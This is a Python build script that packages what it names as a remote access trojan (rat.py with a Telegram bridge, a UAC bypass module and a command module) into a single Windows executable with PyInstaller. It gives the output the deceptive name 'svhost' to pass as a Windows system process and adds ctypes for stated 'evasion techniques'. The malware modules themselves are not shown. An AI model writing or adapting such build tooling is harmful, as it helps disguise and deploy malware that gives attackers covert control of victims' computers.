import subprocess
import sys
from pathlib import Path

# Project directory
PROJECT_DIR = Path(__file__).resolve().parent

# Required Python files
FILES = [
    "rat.py",
    "file_manager.py",
    "telegram_bridge.py",
    "uac_bypass.py",
    "cmds.py",
]

# Additional modules needed for evasion techniques
EVADE_MODULES = [
    "ctypes",
]

APP_NAME = "svhost"

def run_command(command):
    print(f"\n> {' '.join(map(str, command))}")
    subprocess.run(command, cwd=PROJECT_DIR, check=True)

def main():
    missing = [
        filename
        for filename in FILES
        if not (PROJECT_DIR / filename).is_file()
    ]

    if missing:
        print("ERROR: Missing required files:")
        for filename in missing:
            print(f"  - {filename}")
        sys.exit(1)

    # Build the executable
    print("\n[1/2] Building executable...")
    command = [
        sys.executable, "-m", "PyInstaller",
        "--clean",
        "--noconfirm",
        "--onefile",
        "--name", APP_NAME,
        str(PROJECT_DIR / "rat.py"),
    ]

    for module in FILES[1:]:
        command.extend([
            "--hidden-import",
            Path(module).stem,
        ])

    for module in EVADE_MODULES:
        command.extend([
            "--hidden-import",
            module,
        ])

    run_command(command)

    exe_path = PROJECT_DIR / "dist" / f"{APP_NAME}.exe"

    print("\n[2/2] Build finished!")
    if exe_path.exists():
        print(f"Executable: {exe_path}")
    else:
        print("Build completed, but the executable was not found.")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except subprocess.CalledProcessError as error:
        print(f"\nBuild failed with exit code {error.returncode}.")
        sys.exit(error.returncode)
